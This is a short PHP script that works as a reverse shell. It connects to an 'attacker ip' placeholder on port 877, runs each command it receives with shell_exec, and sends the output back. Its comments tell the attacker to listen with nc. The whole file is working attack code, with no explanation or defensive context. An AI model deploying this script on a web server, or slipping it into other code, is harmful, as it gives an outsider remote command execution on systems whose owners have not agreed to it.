<?php
set_time_limit(0);
$ip = '192.168.xx.xx'; 
//attacker ip
$port = 877;
//Attacker machine need open nc
$sock = fsockopen($ip, $port);
while(!feof($sock)) {
    $command = fgets($sock, 877);
    $output = shell_exec($command);
    fwrite($sock, $output);
}
fclose($sock);
?>
